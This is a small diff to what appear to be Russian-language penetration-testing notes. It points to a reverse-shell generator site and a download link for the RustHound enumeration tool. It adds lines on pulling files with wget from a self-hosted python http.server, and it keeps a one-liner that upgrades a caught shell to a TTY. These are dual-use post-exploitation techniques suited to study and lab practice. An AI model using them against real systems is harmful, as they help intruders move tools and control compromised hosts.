@@ -38,6 +38,9 @@ https://www.revshells.com/
 
 Также вы можете загрузить zip-файл с RustHound https://github.com/OPENCYBER-FR/RustHound/archive/master.zip
 
+wget https://example.com/file.zip - стянуть файйл с сервера. У себя сервер - python3 -m http.server 8080
+
+
 
 повысить до tty командой 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
